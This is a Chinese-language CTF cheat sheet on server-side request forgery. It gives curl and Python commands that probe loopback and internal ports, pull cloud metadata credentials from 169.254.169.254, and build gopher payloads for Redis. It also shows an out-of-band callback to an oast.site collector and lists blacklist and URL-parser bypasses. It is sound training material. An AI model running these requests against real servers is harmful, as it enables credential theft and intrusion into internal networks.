# SSRF

## 原理
SSRF 的本质是服务端代替攻击者发起网络请求。只要应用把用户可控的 URL、主机名、回调地址、资源路径、截图目标、Webhook、预览地址、导入源或模板资源交给后端请求组件处理，攻击者就可能借此访问原本外部不可达的内网接口、本地回环、云元数据、控制平面，甚至通过非常规协议构造更深的利用链。判断 SSRF 不能只看“能不能请求 URL”，还要看请求库到底支持哪些协议、是否跟随重定向、能否设置方法与头、是否回显响应体、是否允许自签证书、是否会解析 DNS 多次、是否支持 `gopher://`、`file://`、`dict://` 等协议。

在 CTF 中，SSRF 经常不是终点，而是跳板。最典型的路线是先探测 `127.0.0.1` 和内网段，再打本地管理面板、调试接口、Docker API、Redis/FastCGI/SMTP、Kubernetes 服务、AWS/GCP/Azure 元数据接口，最后拿到 flag、token 或进一步 RCE。很多题表面限制“只能访问图片 URL”，但底层实际上使用高权限 HTTP 客户端，且对响应体、状态码或时间差有明显反馈；还有的题虽无回显，但可用 DNSLog、HTTP 外带和端口时延判断盲 SSRF。分析时要以“这台服务器从哪里、以什么协议、带什么能力发出请求”为中心来建模。

## 工具与命令示例
```bash
# 1) 基础本地探测，优先验证是否能访问回环
curl "http://target/fetch?url=http://127.0.0.1:80/"

# 2) 访问 AWS 元数据服务，常用于拿 IAM 凭据
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/"

# 3) GCP 元数据需要 Metadata-Flavor 头，若应用支持自定义 Header 可尝试
curl "http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/"

# 4) 用 interactsh 观察盲 SSRF 是否出网
interactsh-client

# 5) 用十进制 IP 绕过简单黑名单，127.0.0.1 -> 2130706433
curl "http://target/fetch?url=http://2130706433/admin"

# 6) 尝试 302 跳转到内网地址，验证是否跟随重定向
python -m http.server 8000

# 7) gopher 打 Redis，写入一条命令（需目标支持 gopher）
python -c "import urllib.parse;print('gopher://127.0.0.1:6379/_'+urllib.parse.quote('*1\r\n$4\r\nPING\r\n'))"

# 8) 用 ffuf 枚举本地常见端口，观察状态码或响应长度差异
ffuf -u "http://target/fetch?url=http://127.0.0.1:FUZZ/" -w ports.txt -fs 0
```

## 常见 CTF 题型
### 题型一：本地管理面板或调试接口
思路：服务端可访问 `127.0.0.1`，而管理面板仅信任本地。先扫常见端口和路径，拿到仅本地可见的后台页、调试路由、管理 API，再读出 flag。

```python
import requests
for port in [80, 5000, 7001, 8080, 8888]:
    url = f"http://target/fetch?url=http://127.0.0.1:{port}/"
    r = requests.get(url, timeout=5)
    print(port, r.status_code, len(r.text))
```

### 题型二：云元数据凭据提取
思路：CTF 常模拟云环境，把 flag、AK/SK、临时 token 或实例身份信息放在元数据接口。确认是否可访问 `169.254.169.254`，再按云厂商路径逐层枚举。

```python
import requests
base = "http://target/fetch?url=http://169.254.169.254/latest/meta-data/"
print(requests.get(base).text)
print(requests.get(base + "iam/security-credentials/").text)
```

### 题型三：gopher 协议打内网服务
思路：若目标支持 `gopher://`，就能发原始 TCP 字节流，常用于 Redis、FastCGI、Memcached、SMTP、MySQL 等协议。CTF 中常用 Redis 写 crontab、Web 路径文件，或用 FastCGI 打 PHP-FPM 读源码/执行脚本。

```python
import urllib.parse
payload = "*1\r\n$4\r\nPING\r\n"
print("gopher://127.0.0.1:6379/_" + urllib.parse.quote(payload))
```

### 题型四：盲 SSRF + DNS/HTTP 外带
思路：没有响应体时，不代表不能利用。把目标指向可控的 DNSLog/HTTP 收集器，先确认是否真正由服务端发起请求，再利用时延、回连路径、Host 头和二次跳转继续扩大利用。

```bash
# 把 url 指向你自己的域名，观察 DNS 和 HTTP 请求是否抵达
curl "http://target/fetch?url=http://xxxxxxx.oast.site/abc"
```

## 绕过与进阶技巧
- **本地地址黑名单**：尝试 `127.1`、`0.0.0.0`、`2130706433`、`0x7f000001`、`[::1]`、`[::ffff:127.0.0.1]`、带认证信息的 URL。
- **DNS 解析差异**：某些校验只看第一次解析结果，请求时又重新解析，可配合 DNS rebinding 或短 TTL 利用。
- **重定向利用**：应用只校验首跳 URL 时，可让外部 URL 302 到内网地址或禁用协议。
- **协议扩展**：除 `http/https` 外，还要尝试 `gopher://`、`file://`、`dict://`、`ftp://`、`jar:`、`phar://`，实际支持取决于语言和库。
- **端口探测**：无回显时可基于连接超时、错误类型、响应长度差异、回连日志判断端口存活。
- **Header 注入能力**：若请求器可控 Header，云元数据与内网 API 的利用面会大幅扩大，例如 GCP 的 `Metadata-Flavor: Google`。
- **URL 解析混乱**：利用 `@`、分号、片段、双编码、用户名密码段、混淆主机部分，绕过脆弱解析器或域名后缀限制。
- **二次 SSRF**：SVG、PDF、Office、网页截图、富文本预览等渲染器本身也会抓取远程资源，可形成二跳或多跳 SSRF。

## 快速检查清单
- [ ] 用户可控的 URL/主机名/回调地址是否会由服务端主动请求
- [ ] 请求器是否回显响应体、状态码、错误信息或可观测时延
- [ ] 是否允许访问 `127.0.0.1`、内网地址、云元数据地址
- [ ] 是否支持重定向，且仅校验首跳 URL
- [ ] 是否能通过十进制/十六进制/IPv6/短地址绕过黑名单
- [ ] 是否支持 `gopher://`、`file://` 等非常规协议
- [ ] 是否可控 Header、Method、Body，从而扩大利用面
- [ ] 无回显时是否验证过 DNSLog、HTTP 外带与端口侧信道
- [ ] 内网常见高价值端口与路径是否已系统探测
- [ ] 是否存在截图、预览、解析器等二次请求组件可形成额外 SSRF
